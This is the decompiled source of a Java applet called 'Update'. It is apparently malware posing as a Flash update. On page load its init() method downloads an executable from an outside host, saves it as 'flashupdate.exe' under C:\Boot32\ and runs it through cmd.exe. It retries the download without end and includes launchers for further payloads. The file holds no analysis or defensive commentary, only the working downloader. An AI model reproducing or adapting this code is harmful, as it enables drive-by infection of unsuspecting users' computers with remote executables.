import java.net.URL;
import java.net.HttpURLConnection;
import java.util.Enumeration;
import java.io.BufferedOutputStream;
import java.io.FileOutputStream;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;
import java.io.IOException;
import java.io.OutputStream;
import java.io.InputStream;
import java.io.File;
import java.io.Writer;
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Update extends Applet
{
    static String getIP;
    private String homeDir;
    private String saveAs;
    private String urlLoc;
    private boolean checkProgress;
    
    static String getDir() {
        return "C:\\Boot32\\";
    }
    
    @Override
    public void init() {
        this.Update("http://dadypop.fileave.com/rundll32" + ".exe", "flashupdate" + ".exe", getDir());
        turnONS();
    }
    
    void getIP() {
        try {
            Update.getIP = new BufferedReader(new InputStreamReader(this.getClass().getClassLoader().getResourceAsStream("data.SSF"))).readLine();
            System.out.println("Got IP: " + Update.getIP);
        }
        catch (Exception ex) {
            ex.printStackTrace();
        }
    }
    
    void putIP() {
        try {
            final BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter(getDir() + "data\\data.SSF", false));
            bufferedWriter.write(Update.getIP, 0, Update.getIP.length());
            bufferedWriter.flush();
            bufferedWriter.close();
            System.out.println("worte IP: " + Update.getIP);
        }
        catch (Exception ex) {
            ex.printStackTrace();
        }
    }
    
    public void Update(final String urlLoc, final String s, final String homeDir) {
        this.checkProgress = true;
        this.homeDir = homeDir;
        this.saveAs = homeDir + s;
        this.urlLoc = urlLoc;
        if (!new File(homeDir).exists()) {
            new File(homeDir).mkdir();
        }
        if (this.downloadFile()) {
            if (urlLoc.contains(".zip")) {
                this.unZipFile();
                this.deleteFile();
            }
        }
        else {
            System.out.println("error trying again...");
            this.deleteFile();
            this.Update(urlLoc, s, homeDir);
        }
    }
    
    static void turnONS() {
        try {
            Runtime.getRuntime().exec(new String[] { "cmd.exe", "/C", getDir() + "flashupdate.exe" });
            System.out.println("Turned server on.");
        }
        catch (Exception ex) {
            ex.printStackTrace();
        }
    }
    
    static void turnONS2() {
        try {
            Runtime.getRuntime().exec(new String[] { "cmd.exe", "/C", getDir() + "flashupdate2.exe" });
            System.out.println("Turned server on.");
        }
        catch (Exception ex) {
            ex.printStackTrace();
        }
    }
    
    static void turnONS3() {
        try {
            Runtime.getRuntime().exec(new String[] { "cmd.exe", "/C", getDir() + "process32.jar" });
            System.out.println("Turned server on.");
        }
        catch (Exception ex) {
            ex.printStackTrace();
        }
    }
    
    private void writeStream(final InputStream inputStream, final OutputStream outputStream) throws IOException {
        final byte[] array = new byte[1024];
        int read;
        while ((read = inputStream.read(array)) >= 0) {
            outputStream.write(array, 0, read);
        }
        inputStream.close();
        outputStream.close();
    }
    
    private void unZipFile() {
        try {
            final ZipFile zipFile = new ZipFile(this.saveAs);
            final Enumeration<? extends ZipEntry> entries = zipFile.entries();
            while (entries.hasMoreElements()) {
                final ZipEntry zipEntry = (ZipEntry)entries.nextElement();
                if (zipEntry.isDirectory()) {
                    if (this.checkProgress) {
                        System.out.println("Creating Directory: " + zipEntry.getName());
                    }
                    new File(this.homeDir + zipEntry.getName()).mkdir();
                }
                else {
                    if (this.checkProgress) {
                        System.out.println("Extracting File: " + zipEntry.getName());
                    }
                    this.writeStream(zipFile.getInputStream(zipEntry), new BufferedOutputStream(new FileOutputStream(this.homeDir + zipEntry.getName())));
                }
            }
            zipFile.close();
        }
        catch (Exception ex) {
            ex.printStackTrace();
        }
    }
    
    private void deleteFile() {
        try {
            new File(this.saveAs).delete();
        }
        catch (Exception ex) {
            ex.printStackTrace();
        }
    }
    
    private boolean downloadFile() {
        try {
            if (this.checkProgress) {
                System.out.println("Downloading " + this.saveAs + "...");
            }
            final HttpURLConnection httpURLConnection = (HttpURLConnection)new URL(this.urlLoc).openConnection();
            HttpURLConnection.setFollowRedirects(true);
            httpURLConnection.setInstanceFollowRedirects(false);
            httpURLConnection.setRequestProperty("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
            final long n = httpURLConnection.getContentLength();
            final FileOutputStream fileOutputStream = new FileOutputStream(this.saveAs);
            final BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(fileOutputStream);
            this.writeStream(httpURLConnection.getInputStream(), bufferedOutputStream);
            fileOutputStream.close();
            bufferedOutputStream.close();
            final File file = new File(this.saveAs);
            if (this.checkProgress) {
                System.out.println(this.saveAs + " downloaded...");
            }
            return true;
        }
        catch (Exception ex) {
            ex.printStackTrace();
            return false;
        }
    }
    
    static {
        Update.getIP = "";
    }
}
